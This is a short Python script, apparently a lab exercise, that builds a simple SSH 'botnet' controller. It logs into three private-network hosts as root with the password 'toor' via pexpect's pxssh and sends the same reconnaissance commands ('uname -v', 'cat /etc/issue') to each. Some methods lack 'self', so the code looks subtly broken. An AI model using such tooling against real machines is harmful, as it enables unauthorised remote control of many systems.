'''
    Changes:
        - Used from pexpect import pxssh instead of import pxssh

    Note:
        - The maintainers of pexpect suggest using Paramiko or 
          RedExpect instead of pxssh. RedExpect is fairly 
          interchangeable with pxssh API calls as is.
'''
import optparse
from pexpect import pxssh


class Client:
    

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()


    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')


    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


    def botnet_command(command):
        for client in botNet:
            output = client.send_command(command)
            print('[*] Output from ' + client.host)
            print('[+] ' + output.decode() + '\n')


    def add_client(host, user, password):
        client = Client(host, user, password)
        botNet.append(client)


botNet = []
Client.add_client('10.10.10.110', 'root', 'toor')
Client.add_client('10.10.10.120', 'root', 'toor')
Client.add_client('10.10.10.130', 'root', 'toor')
Client.botnet_command('uname -v')
Client.botnet_command('cat /etc/issue')
